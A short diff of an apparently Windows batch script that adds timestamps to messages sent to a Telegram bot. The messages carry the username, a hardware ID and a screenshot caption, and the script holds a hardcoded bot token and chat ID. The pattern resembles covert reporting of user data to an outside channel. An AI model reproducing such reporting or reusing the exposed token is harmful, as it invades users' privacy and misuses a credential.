@@ -1164,7 +1164,7 @@ echo.
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%|RUNNING.....|%date%/%time%|"
+set "MESSAGEEVERY=%USERNAME%|RUNNING.....|%time%"
 
 
 :: URL encode the message by replacing spaces with %20
@@ -1354,7 +1354,7 @@ echo.
 :: Set bot token, chat ID, and caption
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "CAPTION=Computer|%USERNAME%|%HWID%|STARTED|%MESSAGE%"
+set "CAPTION=Computer|%USERNAME%|%HWID%|STARTED|%MESSAGE%|%time%"
 set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
 :: URL encode the caption
